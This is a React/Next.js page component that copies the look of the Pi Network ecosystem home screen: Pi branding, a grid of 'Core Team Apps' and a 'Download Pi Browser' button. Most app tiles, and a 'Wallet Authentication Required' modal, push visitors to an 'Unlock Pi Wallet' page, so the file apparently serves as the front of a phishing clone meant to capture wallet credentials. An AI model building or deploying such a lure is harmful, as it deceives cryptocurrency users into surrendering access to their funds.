"use client";

import React, { useState } from "react";
import Link from "next/link";
import { ChevronDown, ChevronUp, Lock, ChevronLeft, ChevronRight, HelpCircle, Search, Wrench, Share2 } from "lucide-react";
import {
  PiLogo,
  PiHeaderLogo,
  PiNetLogo,
  PiWelcomeLogo,
  FiresideIcon,
  WalletIcon,
  BrainstormIcon,
  BlockchainIcon,
  MineIcon,
  VerifyIcon,
  DevPortalIcon,
  KYCIcon,
  ChatIcon,
  MigrationIcon,
  ProfileIcon,
} from "@/components/pi-icons";

export default function HomePage() {
  const [isDrawerOpen, setIsDrawerOpen] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [modalAppName, setModalAppName] = useState("");

  const apps = [
    {
      id: "fireside",
      name: "Fireside",
      icon: FiresideIcon,
      path: "/wallet?source=Fireside",
      direct: false,
      className: "w-full h-full text-primary-500"
    },
    {
      id: "wallet",
      name: "Wallet",
      icon: WalletIcon,
      path: "/wallet?source=Wallet",
      direct: true,
      className: "w-full h-full text-primary-500"
    },
    {
      id: "brainstorm",
      name: "Brainstorm",
      icon: BrainstormIcon,
      path: "/wallet?source=Brainstorm",
      direct: false,
      className: "w-full h-full text-primary-500"
    },
    {
      id: "blockchain",
      name: "Blockchain",
      icon: BlockchainIcon,
      path: "/wallet?source=Blockchain",
      direct: false,
      className: "w-full h-full text-primary-500"
    },
    {
      id: "mine",
      name: "Mine",
      icon: MineIcon,
      path: "/wallet?source=Mine",
      direct: false,
      className: "w-full h-full text-primary-500"
    },
    {
      id: "verify",
      name: "Verify Transaction",
      icon: VerifyIcon,
      path: "/verify",
      direct: true,
      className: ""
    },
    {
      id: "devportal",
      name: "DevPortal",
      icon: DevPortalIcon,
      path: "/wallet?source=DevPortal",
      direct: false,
      className: "w-full h-full text-primary-500"
    },
    {
      id: "kyc",
      name: "KYC",
      icon: KYCIcon,
      path: "/kyc",
      direct: true,
      className: "w-full h-full text-primary-500 p-2"
    },
    {
      id: "chat",
      name: "Chat",
      icon: ChatIcon,
      path: "/wallet?source=Chat",
      direct: false,
      className: "w-full h-full text-primary-500"
    },
    {
      id: "migration",
      name: "Migration",
      icon: MigrationIcon,
      path: "/migration",
      direct: true,
      className: "w-full h-full text-primary-500"
    },
    {
      id: "profile",
      name: "Profile",
      icon: ProfileIcon,
      path: "/wallet?source=Profile",
      direct: false,
      className: "w-full h-full text-primary-500"
    },
  ];

  const handleAppClick = (app: typeof apps[0], e: React.MouseEvent) => {
    if (!app.direct) {
      e.preventDefault();
      setModalAppName(app.name);
      setShowModal(true);
    }
  };

  return (
    <div className="min-h-screen bg-zinc-100 sm:bg-white flex justify-center items-start text-zinc-800">
      {/* Container - wraps as mobile container on mobile, full-width on desktop */}
      <div className="w-full max-w-md sm:max-w-none min-h-screen bg-white flex flex-col relative shadow-2xl sm:shadow-none border-x border-zinc-200 sm:border-x-0">

        {/* Top Header Placeholder */}
        <div className="relative z-20 h-14">
          <header className="bg-[#703d92] text-white h-14 fixed top-0 left-0 right-0 z-30 shadow-md">
            <div className="flex justify-between items-center w-full h-full px-4 max-w-screen-2xl mx-auto">
              {/* Desktop: PiNet Logo */}
              <div className="hidden sm:flex items-center min-w-[120px]">
                <Link href="/" className="text-[#FBB44A] hover:text-[#e5a03b] transition-colors">
                  <PiNetLogo className="h-9 w-auto" />
                </Link>
              </div>

              {/* Center: Title + Pi Logo */}
              <div className="flex-1 flex justify-center items-center gap-2 sm:gap-3">
                <span className="text-lg sm:text-xl font-semibold tracking-wide">Home</span>
                <PiHeaderLogo size={26} className="text-[#FBB44A]" />
              </div>

              {/* Desktop: Download button */}
              <div className="hidden sm:flex items-center justify-end min-w-[120px]">
                <button className="rounded-lg transition duration-300 px-4 py-1.5 font-semibold bg-[#FBB44A] hover:bg-[#e5a03b] text-zinc-900 text-sm shadow-sm cursor-pointer">
                  Download Pi Browser
                </button>
              </div>
            </div>
          </header>
        </div>

        {/* Main Body Container below header */}
        <div className="h-[calc(100vh-3.5rem)] sm:fixed sm:bottom-0 sm:left-0 sm:right-0 sm:overflow-y-auto sm:z-0 flex flex-col sm:flex-row">

          {/* Collapsible Sidebar Drawer - Desktop only */}
          <aside className="hidden sm:block relative h-full w-10 shrink-0">
            <aside
              className={`fixed top-14 bottom-0 left-0 w-[360px] bg-white border-r border-zinc-150 flex flex-col items-center shadow-lg text-black py-8 transition-transform duration-200 z-10 ${isDrawerOpen ? "translate-x-0" : "-translate-x-[320px]"
                }`}
            >
              {/* Drawer Toggle Button */}
              <span className="absolute top-[50%] right-0 translate-y-[-50%] translate-x-[50%] z-20">
                <button
                  onClick={() => setIsDrawerOpen(!isDrawerOpen)}
                  className="text-[#703d92] border border-[#703d92] bg-white rounded-full overflow-hidden w-10 h-10 flex justify-center items-center hover:bg-zinc-50 active:scale-95 transition-all shadow-md cursor-pointer"
                >
                  <ChevronLeft className={`w-5 h-5 transition-transform duration-300 ${!isDrawerOpen ? "rotate-180" : ""}`} />
                </button>
              </span>

              {/* Drawer Navigation Links */}
              <div className="w-full flex-1 flex flex-col px-10">
                <div className="flex-1 flex flex-col justify-center">
                  <ul className="space-y-6">
                    <li>
                      <Link href="/" className="text-zinc-700 hover:text-zinc-900 text-base font-semibold flex items-center gap-3">
                        <HelpCircle className="w-5 h-5 text-zinc-400" />
                        <span>What is PiNet</span>
                      </Link>
                    </li>
                    <li>
                      <Link href="/" className="text-[#FBB44A] hover:text-[#e5a03b] text-base font-semibold flex items-center gap-3">
                        <Search className="w-5 h-5" />
                        <span>Explore the Ecosystem</span>
                      </Link>
                    </li>
                    <li>
                      <Link href="/" className="text-zinc-700 hover:text-zinc-900 text-base font-semibold flex items-center gap-3">
                        <Wrench className="w-5 h-5 text-zinc-400" />
                        <span>Support</span>
                      </Link>
                    </li>
                    <li>
                      <button className="text-zinc-700 hover:text-zinc-900 text-base font-semibold flex items-center gap-3 cursor-pointer w-full text-left">
                        <Share2 className="w-5 h-5 text-zinc-400" />
                        <span>Share</span>
                      </button>
                    </li>
                  </ul>
                </div>

                {/* Drawer Footer */}
                <div className="w-full pt-4 border-t border-zinc-150 flex flex-col items-center">
                  <Link href="/" className="text-sm text-[#703d92] hover:text-[#60337d] font-bold underline mb-4">
                    Privacy Policy
                  </Link>
                  <button className="inline-block rounded-lg text-center transition duration-300 px-4 py-2 w-full text-white bg-[#703d92] hover:bg-[#60337d] font-semibold text-sm cursor-pointer shadow-sm">
                    Explore the Ecosystem
                  </button>
                </div>
              </div>
            </aside>
          </aside>

          {/* Main Panel Content Area */}
          <main className="flex-grow flex flex-col h-full overflow-y-auto pb-16 sm:pl-10">
            <div className="wrapper mx-auto flex w-full max-w-2xl flex-1 flex-col justify-start sm:justify-center px-4">

              {/* Welcome Banner */}
              <div className="flex flex-row items-center justify-center gap-2 sm:gap-3.5 mt-8 mb-2 px-4 w-full">
                <PiHeaderLogo className="text-[#FBB44A] w-9 h-9 sm:w-14 sm:h-14 shrink-0 transform hover:scale-105 transition-transform duration-300" />
                <span className="text-[14px] sm:text-lg md:text-xl font-semibold text-[#e5a03b] tracking-wide text-left whitespace-nowrap">
                  Welcome to the Pi Ecosystem
                </span>
              </div>

              {/* Section Header: Core Team Apps */}
              <div className="flex justify-between items-center mt-8 px-2 max-w-xl mx-auto w-full">
                <h2 className="text-zinc-900 font-bold text-base">Core Team Apps</h2>
                <button className="text-[#703d92] cursor-pointer hover:opacity-80 transition-opacity">
                  <ChevronUp className="w-5 h-5" />
                </button>
              </div>

              {/* Grid Area */}
              <div className="mt-3">
                <div className="grid grid-cols-3 gap-3 max-w-xl mx-auto">
                  {apps.map((app) => {
                    const Icon = app.icon;
                    return (
                      <Link
                        key={app.id}
                        href={app.path}
                        onClick={(e) => handleAppClick(app, e)}
                        className="group inline-flex flex-col justify-center items-center cursor-pointer pt-2 mb-2 rounded-lg focus:outline-none select-none"
                      >
                        <div className="w-16 h-16 flex justify-center items-center rounded-2xl mb-2 border border-[#703d92]/25 bg-white shadow-sm group-focus-within:ring-primary-300 group-hover:outline-none group-hover:ring-primary-300 transition duration-150 overflow-hidden group-focus-within:ring-2">
                          <Icon className={app.className} />
                        </div>
                        <span className="text-[#7a2b7b] text-xs font-semibold text-center leading-tight max-w-[90px]">
                          {app.name}
                        </span>
                      </Link>
                    );
                  })}
                </div>
              </div>

              {/* Mobile Navigation bar spacer */}
              <div className="h-16 sm:hidden" />
            </div>
          </main>
        </div>

        {/* Bottom Navigation - Mobile Only */}
        <nav className="fixed bottom-0 w-full max-w-md bg-white border-t border-zinc-200 h-16 flex items-center justify-around z-30 shadow-[0_-2px_10px_rgba(0,0,0,0.05)] sm:hidden">
          <Link href="/" className="flex flex-col items-center justify-center gap-1 group cursor-pointer">
            <svg
              className="w-6 h-6 text-[#7a2b7b]"
              fill="currentColor"
              viewBox="0 0 24 24"
            >
              <path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z" />
            </svg>
            <span className="text-[10px] font-bold text-[#7a2b7b]">Home</span>
          </Link>
          <button
            onClick={() => {
              setModalAppName("PiApps directory");
              setShowModal(true);
            }}
            className="flex flex-col items-center justify-center gap-1 group cursor-pointer text-zinc-400 hover:text-[#7a2b7b] transition-colors"
          >
            <svg
              className="w-6 h-6"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
              viewBox="0 0 24 24"
            >
              <path strokeLinecap="round" strokeLinejoin="round" d="M4 6a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2V6zM14 6a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2h-2a2 2 0 01-2-2V6zM4 16a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2v-2zM14 16a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2h-2a2 2 0 01-2-2v-2z" />
            </svg>
            <span className="text-[10px] font-semibold">PiApps</span>
          </button>
          <button
            onClick={() => {
              setModalAppName("Pi Services");
              setShowModal(true);
            }}
            className="flex flex-col items-center justify-center gap-1 group cursor-pointer text-zinc-400 hover:text-[#7a2b7b] transition-colors"
          >
            <svg
              className="w-6 h-6"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
              viewBox="0 0 24 24"
            >
              <path strokeLinecap="round" strokeLinejoin="round" d="M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4" />
            </svg>
            <span className="text-[10px] font-semibold">Services</span>
          </button>
        </nav>

        {/* Modal Prompt */}
        {showModal && (
          <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-6 animate-fade-in">
            <div className="bg-white rounded-2xl w-full max-w-sm p-6 shadow-xl border border-black flex flex-col items-center text-center">
              <div className="w-12 h-12 bg-amber-50 rounded-full flex items-center justify-center text-amber-600 mb-4">
                <Lock className="w-6 h-6" />
              </div>
              <h3 className="text-zinc-800 font-bold text-base">Wallet Authentication Required</h3>
              <p className="text-zinc-500 text-xs mt-2 leading-relaxed">
                To access <strong>{modalAppName}</strong>, you must unlock and authorize your Pi Wallet.
              </p>
              <div className="w-full flex flex-col gap-2 mt-6">
                <Link
                  href={`/wallet?source=${encodeURIComponent(modalAppName)}`}
                  className="w-full bg-[#703d92] hover:bg-[#60337d] text-white py-2.5 rounded-xl text-xs font-semibold shadow-md transition-colors"
                >
                  Unlock Pi Wallet
                </Link>
                <button
                  onClick={() => setShowModal(false)}
                  className="w-full bg-zinc-50 hover:bg-zinc-100 text-zinc-500 py-2.5 rounded-xl text-xs font-semibold transition-colors border border-zinc-200"
                >
                  Cancel
                </button>
              </div>
            </div>
          </div>
        )}

      </div>
    </div>
  );
}
